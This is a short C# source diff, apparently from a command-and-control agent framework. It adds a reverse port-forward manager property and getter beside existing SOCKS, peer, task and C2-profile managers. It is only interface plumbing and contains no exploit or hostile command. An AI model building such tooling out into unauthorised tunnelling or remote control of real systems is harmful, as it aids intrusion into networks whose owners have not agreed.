@@ -20,6 +20,7 @@ namespace ApolloInterop.Classes
         public IPeerManager PeerManager { get; protected set; }
         public ITaskManager TaskManager { get; protected set; }
         public ISocksManager SocksManager { get; protected set; }
+        public IRpfwdManager RpfwdManager { get; protected set; }
         public IApi Api { get; protected set; }
         public IC2ProfileManager C2ProfileManager { get; protected set; }
         public ICryptographySerializer Serializer { get; protected set; }
@@ -93,6 +94,7 @@ namespace ApolloInterop.Classes
         public virtual ITaskManager GetTaskManager() { return TaskManager; }
         public virtual IPeerManager GetPeerManager() { return PeerManager; }
         public virtual ISocksManager GetSocksManager() { return SocksManager; }
+        public virtual IRpfwdManager GetRpfwdManager() { return RpfwdManager; }
         public virtual IC2ProfileManager GetC2ProfileManager() { return C2ProfileManager; }
         public virtual ICryptographySerializer GetCryptographySerializer() { return Serializer; }
         public virtual IFileManager GetFileManager() { return FileManager; }
